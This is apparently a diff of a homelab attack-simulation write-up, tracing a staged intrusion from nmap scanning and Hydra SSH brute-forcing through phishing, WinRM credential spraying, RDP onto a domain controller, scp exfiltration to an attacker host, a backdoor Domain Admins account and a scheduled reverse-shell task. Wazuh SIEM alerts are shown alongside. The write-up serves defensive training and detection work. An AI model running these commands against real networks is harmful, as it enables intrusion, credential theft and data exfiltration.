@@ -29,13 +29,11 @@ My objectives were to:
 
 The simulation follows the **Cyber Attack Lifecycle**, where each phase naturally progresses into the next - closely resembling how I've seen real-world attacks unfold inside enterprise environments.
 
-> ⚠️ **Disclaimer:** I performed this simulation entirely inside my isolated homelab environment for cybersecurity education and defensive research purposes only.
+>  **Disclaimer:** I performed this simulation entirely inside my isolated homelab environment for cybersecurity education and defensive research purposes only.
 
-![Cyber Attack Lifecycle](cyber_attack_lifecycle.png)
-*Here is the overall cyber attack lifecycle I used throughout this simulation, from reconnaissance to persistence.*
+![Here is the overall cyber attack lifecycle I used throughout this simulation, from reconnaissance to persistence.](cyber_attack_lifecycle.png)
 
-![Cyber Attack Topology](cyber_attack_topology.png)
-*This maps out the attack path I took between my attacker machine, enterprise hosts, email infrastructure, and domain controller during the simulation.*
+![This maps out the attack path I took between my attacker machine, enterprise hosts, email infrastructure, and domain controller during the simulation.](cyber_attack_topology.png)
 
 ## The Scenario
 
@@ -43,8 +41,8 @@ I acted as a financially motivated attacker targeting Project X to steal proprie
 
 | | |
 |---|---|
-| 🧠 **My Motive** | Financially Motivated |
-| 🏆 **My Goal** | Exfiltrate sensitive data and maintain persistent access |
+|  **My Motive** | Financially Motivated |
+|  **My Goal** | Exfiltrate sensitive data and maintain persistent access |
 
 ## Phase 1 - Reconnaissance
 
@@ -58,8 +56,7 @@ On my attacker machine, I ran an Nmap scan across the network:
 nmap -p1-1000 -Pn -sV 10.0.0.8/24
 ```
 
-![`nmap` scanning output with `10.0.0.8` returning open ports, specifically port 22 (SSH) with the service version visible. This is the first piece of intelligence gathered on the target.](screenshot1.png)
-*My `nmap` scan results showing `10.0.0.8` returning open ports, specifically port 22 (SSH). This was my first piece of intelligence gathered on the target.*
+![My `nmap` scan results showing `10.0.0.8` returning open ports, specifically port 22 (SSH). This was my first piece of intelligence gathered on the target.](screenshot1.png)
 
 The results revealed that `10.0.0.8` (`project-x-corp-server`) was up and running **SSH on port 22**. I didn't yet know what kind of server this was - a jumphost, a license server, or something else entirely. But SSH was open, and that was enough to proceed.
 
@@ -71,8 +68,7 @@ I used Hydra with the `rockyou.txt` wordlist - a dictionary of millions of commo
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8
 ```
 
-![Hydra brute-force command running and then returning a successful hit, the output line showing `[22][ssh], host: 10.0.0.8, login: root, password: november`.](screenshot2.png)
-*Running my Hydra brute-force command. After a short wait, it returned a successful hit for the root account.*
+![Running my Hydra brute-force command. After a short wait, it returned a successful hit for the root account.](screenshot2.png)
 
 After a few minutes, Hydra returned a hit. I logged in:
 
@@ -81,8 +77,7 @@ ssh root@10.0.0.8
 # password: november
 ```
 
-![the `ssh root@10.0.0.8` command followed by the successful SSH login banner and shell prompt, confirming we are now inside the corporate server as root.](screenshot3.png)
-*My successful SSH login as root, dropping me right into the corporate server's shell.*
+![My successful SSH login as root, dropping me right into the corporate server's shell.](screenshot3.png)
 
 I was in. Reconnaissance had successfully transitioned directly into initial access.
 
@@ -104,8 +99,7 @@ ls -la /home            # check user directories
 find / -name "password" 2>/dev/null   # hunt for credential files
 ```
 
-![Terminal inside the SSH session on `project-x-corp-server` showing the output of `netstat -tuln` with port 1025 (SMTP/MailHog) and 8025 (MailHog web interface) visible in the listening services list, this is the key discovery that leads to the phishing vector.](screenshot4.png)
-*Checking `netstat -tuln` from my SSH session revealed port 1025 (SMTP/MailHog) and 8025 (MailHog web interface) listening. This was my phishing vector.*
+![Checking `netstat -tuln` from my SSH session revealed port 1025 (SMTP/MailHog) and 8025 (MailHog web interface) listening. This was my phishing vector.](screenshot4.png)
 
 One finding stood out: **SMTP port 1025 was listening**. I queried the MailHog API directly:
 
@@ -113,11 +107,9 @@ One finding stood out: **SMTP port 1025 was listening**. I queried the MailHog A
 curl http://10.0.0.8:8025/api/v2/messages
 ```
 
-![Terminal showing the `curl` command output returning a JSON response from the MailHog API with the email fields visible, including `To: janed@linux-client` as the recipient address. This is the moment the attacker identifies their phishing target.](screenshot5.png)
-*Querying the MailHog API gave me a JSON response showing internal emails, including one to `janed@linux-client`.*
+![Querying the MailHog API gave me a JSON response showing internal emails, including one to `janed@linux-client`.](screenshot5.png)
 
-![We find an email in the inbox addressed to `janed@linux-client`. That's a user on the internal network. We now have a target for a phishing campaign.](screenshot6.png)
-*I found a user on the internal network: `janed@linux-client`. I now had a target for my phishing campaign.*
+![I found a user on the internal network: `janed@linux-client`. I now had a target for my phishing campaign.](screenshot6.png)
 
 ### Setup the Phish
 
@@ -131,11 +123,9 @@ sudo chmod 666 /var/www/html/creds.log
 sudo service apache2 start
 ```
 
-![Kali browser showing the fake credential-harvesting login page at `http://localhost` displaying the spoofed ProjectX login form with username and password fields. This visually demonstrates what Jane will see when she clicks the phishing link.](screenshot7.png)
-*Here is the fake credential-harvesting page I spun up on my Kali machine. This is exactly what Jane would see.*
+![Here is the fake credential-harvesting page I spun up on my Kali machine. This is exactly what Jane would see.](screenshot7.png)
 
-![Terminal on the attacker machine showing the contents of `creds.log` after a test submission, displaying a dummy username and password captured from the fake login page, confirming the harvesting works.](screenshot8.png)
-*Testing my `creds.log` file to make sure it was successfully capturing submitted credentials.*
+![Testing my `creds.log` file to make sure it was successfully capturing submitted credentials.](screenshot8.png)
 
 ### Send the Phishing Email
 
@@ -175,11 +165,9 @@ sudo python3 send_email.py
 
 On `project-x-linux-client`, the email poller picked up my new message from MailHog and alerted the terminal. Jane sees the notification and clicks the link.
 
-![Terminal on `project-x-linux-client` showing the `email_poller.sh` script printing an alert - something like "New email received!" or the email subject "Update Password!" appearing in the output, simulating Jane's inbox notification.](screenshot9.png)
-*On the Linux client side, my `email_poller.sh` script alerted Jane to the new "urgent" email.*
+![On the Linux client side, my `email_poller.sh` script alerted Jane to the new "urgent" email.](screenshot9.png)
 
-![Kali browser showing the fake login page with Jane's credentials typed into the form fields (use dummy credentials for the screenshot) just before she hits submit.](screenshot10.png)
-*Jane visiting my phishing link and typing in her credentials.*
+![Jane visiting my phishing link and typing in her credentials.](screenshot10.png)
 
 Going back to my attacker machine:
 
@@ -187,8 +175,7 @@ Going back to my attacker machine:
 cat /var/www/html/creds.log
 ```
 
-![Kali terminal showing `cat creds.log` output with Jane's captured credentials visible - `janed` and `@password123!`, this is the payoff screenshot of the phishing phase.](screenshot11.png)
-*The payoff: checking my `creds.log` and finding Jane's captured credentials in plain text.*
+![The payoff: checking my `creds.log` and finding Jane's captured credentials in plain text.](screenshot11.png)
 
 I used those credentials to SSH into the Linux client:
 
@@ -196,8 +183,7 @@ I used those credentials to SSH into the Linux client:
 ssh janed@10.0.0.101
 ```
 
-![Kali terminal showing `ssh jane@10.0.0.101` completing successfully and landing on the `project-x-linux-client` shell prompt - two machines now compromised.](screenshot12.png)
-*Using Jane's credentials, I successfully SSH'd into `project-x-linux-client`. Two machines compromised.*
+![Using Jane's credentials, I successfully SSH'd into `project-x-linux-client`. Two machines compromised.](screenshot12.png)
 
 ## Phase 3 - Lateral Movement + Privilege Escalation
 
@@ -209,8 +195,7 @@ From `project-x-linux-client`, I ran another Nmap scan to map the rest of the ne
 nmap -Pn -p1-65535 -sV 10.0.0.0/24
 ```
 
-![Nmap scan results with `10.0.0.100` returning **ports 5985 and 5986 open** - labelled as WinRM (Windows Remote Management).](screenshot13.png)
-*My internal Nmap scan found `10.0.0.100` with WinRM ports 5985 and 5986 wide open.*
+![My internal Nmap scan found `10.0.0.100` with WinRM ports 5985 and 5986 wide open.](screenshot13.png)
 
 Ports 5985 and 5986 were open on `10.0.0.100` - those are WinRM ports. WinRM is a legitimate Windows administration protocol that I know is commonly abused for lateral movement and remains highly relevant in today's threat landscape.
 
@@ -230,8 +215,7 @@ Administrator
 nxc winrm 10.0.0.100 -u users.txt -p pass.txt
 ```
 
-![`nxc winrm` command output returning a successful hit, the green `[+] 10.0.0.100 Administrator:@Deeboodah1! (Pwn3d!)` line confirming the credential spray worked.](screenshot14.png)
-*My NetExec credential spray returned a successful hit against the Administrator account.*
+![My NetExec credential spray returned a successful hit against the Administrator account.](screenshot14.png)
 
 ### Establishing a Shell with Evil-WinRM
 
@@ -239,13 +223,11 @@ nxc winrm 10.0.0.100 -u users.txt -p pass.txt
 evil-winrm -I 10.0.0.100 -u Administrator -p @Deeboodah1!
 ```
 
-![`evil-winrm` session has successfully established, the Evil-WinRM banner confirming we have a live PowerShell session on `project-x-win-client` as Administrator.](screenshot15.png)
-*I dropped into an Evil-WinRM shell, giving me full Administrator access over the Windows client.*
+![I dropped into an Evil-WinRM shell, giving me full Administrator access over the Windows client.](screenshot15.png)
 
 I now had a PowerShell session on `project-x-win-client` as Administrator. Privilege escalation achieved.
 
-![A WinRM Logon alert has triggered - the "WinRM Logon" monitor we created in Part 2 firing with the Kerberos Event ID 4624 log visible, showing the alert working as designed from the blue team side.](screenshot16.png)
-*On the blue team side, my Wazuh SIEM successfully triggered a WinRM Logon alert based on this activity.*
+![On the blue team side, my Wazuh SIEM successfully triggered a WinRM Logon alert based on this activity.](screenshot16.png)
 
 ## Phase 4 - Lateral Movement 2.0 (Pivoting to the Domain Controller)
 
@@ -257,8 +239,7 @@ From inside the Windows client session, I checked what domain this workstation b
 nltest /dsgetdc:
 ```
 
-![Evil-WinRM PowerShell session showing the output of `nltest /dsgetdc:` which returns the domain name `corp.project-x-dc.com` and the DC IP address `10.0.0.5`.](screenshot17.png)
-*Querying the domain showed me the domain controller was sitting at `10.0.0.5`.*
+![Querying the domain showed me the domain controller was sitting at `10.0.0.5`.](screenshot17.png)
 
 The domain controller was at `10.0.0.5` and port **3389 (RDP)** was open. Since I had valid Administrator credentials, I tried RDP from my attacker machine using XFreeRDP:
 
@@ -266,16 +247,13 @@ The domain controller was at `10.0.0.5` and port **3389 (RDP)** was open. Since 
 xfreerdp /v:10.0.0.5 /u:Administrator /p:@Deeboodah1! /d:corp.project-x-dc.com
 ```
 
-![The RDP session window opening on the Kali desktop - showing the Windows Server 2025 desktop of `project-x-dc` logged in as Administrator. This is the "keys to the kingdom" moment visually.](screenshot18.png)
-*I successfully RDP'd into the Domain Controller. This was my "keys to the kingdom" moment.*
+![I successfully RDP'd into the Domain Controller. This was my "keys to the kingdom" moment.](screenshot18.png)
 
 I was now on the **Domain Controller**. Browsing the file system, I found exactly what I was after inside `C:\Users\Administrator\Documents\ProductionFiles\secrets.txt`.
 
-![Windows File Explorer on the RDP session inside `project-x-dc`, showing `secrets.txt` open in Notepad with its contents visible, confirming the sensitive file has been located.](screenshot19.png)
-*Finding my target file `secrets.txt` safely stored on the DC.*
+![Finding my target file `secrets.txt` safely stored on the DC.](screenshot19.png)
 
-![A FIM event triggered for `secrets.txt` - with the rule description "File integrity monitoring alert" appearing in the alert list.](screenshot20.png)
-*My Wazuh File Integrity Monitoring caught me opening the file, triggering an alert.*
+![My Wazuh File Integrity Monitoring caught me opening the file, triggering an alert.](screenshot20.png)
 
 ## Phase 5 - Data Exfiltration
 
@@ -287,14 +265,11 @@ With access to the domain controller and the file located, I used `scp` to copy 
 scp ".\secrets.txt" attacker@10.0.0.50:/home/attacker/my_sensitive_file.txt
 ```
 
-![Terminal inside the RDP session on `project-x-dc` showing the `scp` command executing and completing](screenshot21.png)
-*Using `scp` to exfiltrate the file out of the network.*
+![Using `scp` to exfiltrate the file out of the network.](screenshot21.png)
 
-![The contents of the exfiltrated `secrets.txt` file successfully received on the attacker machine.](screenshot22.png)
-*The sensitive data successfully landed on my Kali machine.*
+![The sensitive data successfully landed on my Kali machine.](screenshot22.png)
 
-![**"File Accessed"** alert in an active/triggered state, confirming the SIEM caught the file access on the DC side.](screenshot23.png)
-*Wazuh catching the file access on the DC side.*
+![Wazuh catching the file access on the DC side.](screenshot23.png)
 
 ## Phase 6 - Persistence
 
@@ -313,11 +288,9 @@ net group "Domain Admins" project-x-user /add
 net user project-x-user /domain
 ```
 
-![Terminal inside the DC session confirming the new account exists, listing its group memberships including `Domain Admins` and `Administrators`.](screenshot24.png)
-*I created a backdoor account and added it to the Domain Admins group.*
+![I created a backdoor account and added it to the Domain Admins group.](screenshot24.png)
 
-![Active Directory Users and Computers (ADUC) on `project-x-dc` showing `project-x-user` listed under the Users container - a visual confirmation from the admin side that the rogue account now exists in the domain.](screenshot25.png)
-*A quick check in ADUC confirming my rogue account was successfully created.*
+![A quick check in ADUC confirming my rogue account was successfully created.](screenshot25.png)
 
 ### Scheduled Task with Reverse Shell
 
@@ -375,11 +348,9 @@ Set-ExecutionPolicy Unrestricted -Scope Process
 .\reverse.ps1
 ```
 
-![Kali showing `nc -lvnp 4444` (the listener waiting) and the reverse shell connection established with the message "Connected to reverse shell!" and a Windows prompt appearing.](screenshot26.png)
-*My reverse shell connected back successfully!*
+![My reverse shell connected back successfully!](screenshot26.png)
 
-![Windows Task Scheduler on `project-x-dc` showing `PersistenceTask` listed in the Task Scheduler Library - confirming the scheduled task was created and will run `reverse.ps1` daily at 12:00.](screenshot27.png)
-*Confirming my scheduled task was set to run daily, ensuring persistence.*
+![Confirming my scheduled task was set to run daily, ensuring persistence.](screenshot27.png)
 
 ## Phase 7 - Defense Evasion
 
